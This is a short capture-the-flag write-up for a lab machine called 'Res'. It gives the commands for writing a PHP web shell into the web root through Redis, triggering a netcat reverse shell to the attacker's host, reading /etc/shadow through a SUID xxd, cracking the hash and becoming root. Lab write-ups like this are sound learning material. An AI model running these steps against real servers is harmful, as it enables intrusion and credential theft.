# Res

Scanning the environment we find an apache webserver and a redis database...

``` sh
sudo nmap -sC -sV -sS 10.10.103.145 -p-
```

When connecting to redis we can set write a file to the main apache dir and create a simple php reverse shell:

``` sh
redis-cli -h 10.10.103.145
>config set dir /var/www/html
>config set dbfilename shell.php
>set test "<?php system($_GET['cmd']);?>"
```

Before we visit our new page we should open a netcat session:

``` sh
nc -nvlp 666
```

Time to run our shell.php :)

``` sh
http://10.10.103.145/shell.php?cmd=nc 10.10.146.116 667 -e /bin/sh
```

Once we are succesfully connected we can stabilize the shell and view the first flag:

``` sh
python3 -c 'import pty;pty.spawn("/bin/bash")'
cat /home/vianka/user.txt
```

Lets have a look at the passwd

``` sh
cat /etc/passwd
vianka:x:1000:1000:Res,,,:/home/vianka:/bin/bash
```

There is SUID bit set for xxd. To access the shadow file can use [this trick](https://gtfobins.github.io/gtfobins/xxd/).

``` sh
LFILE=/etc/shadow
xxd "$LFILE" | xxd -r
vianka:$6$2p.tSTds$qWQfsXwXOAxGJUBuq2RFXqlKiql3jxlwEWZP6CWXm7kIbzR6WzlxHR.UHmi.hc1/TuUOUBo/jWQaQtGSXwvri0:18507:0:99999:7:::
```

Time to crack the password:

``` sh
unshadow passwd.txt shadow.txt > hash.txt
john hash.txt
```

Once we have the password we can escalate our priviledges to vianka which somehow also has root access.

``` sh
su vianka
sudo su
cat /root/root.txt
```
